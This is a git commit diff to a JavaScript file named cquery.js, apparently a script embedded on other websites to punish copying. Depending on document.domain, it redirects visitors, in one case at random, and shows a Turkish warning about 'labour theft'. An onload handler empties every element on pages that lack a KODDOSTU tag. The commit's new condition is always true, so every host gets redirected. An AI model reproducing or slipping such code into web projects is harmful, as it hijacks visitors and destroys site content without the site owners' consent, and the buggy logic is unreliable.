918f70da63c01ccbfb89f4a6d8103ad01a76338d
kilavuzcu@gmail.com <kilavuzcu@gmail.com@3e4efce4-d64c-69f8-84b6-72d23f97b73c>
2014-02-08 11:11:32 +0000

    gry

--- cquery.js
+++ cquery.js
@@ -6,6 +6,6 @@ if(document.domain == 'www.s' + ad + 'un.com'){
 if(document.domain == 's' + ad + 'un.com'){
   var zar = Math.floor((Math.random()*100)+1); if(zar >= 80){location.href='http://tam1oyun.blogspot.com.tr'}
 }
-if(document.domain == 'www.kodyolu.com'){alert('UYARI: Emek hırsızlığı kötü sonuçlar doğurabilir.');location.href='http://www.koddostu.com';}
-if(document.domain == 'kodyolu.com'){alert('UYARI: Emek hırsızlığı kötü sonuçlar doğurabilir.');location.href='http://www.koddostu.com';}
+
+if(document.domain == 'kodperest.blogspot.com' || 'www.kodyolu.com' || 'kodyolu.com'){alert('UYARI: Emek hırsızlığı kötü sonuçlar doğurabilir.');location.href='http://www.koddostu.com';}
 window.onload=function(){var a=document;if(0==a.getElementsByTagName("KODDOSTU").length)for(var a=a.getElementsByTagName("*"),b=0,c=a.length;c>b;b++)a[b].innerHTML="";};
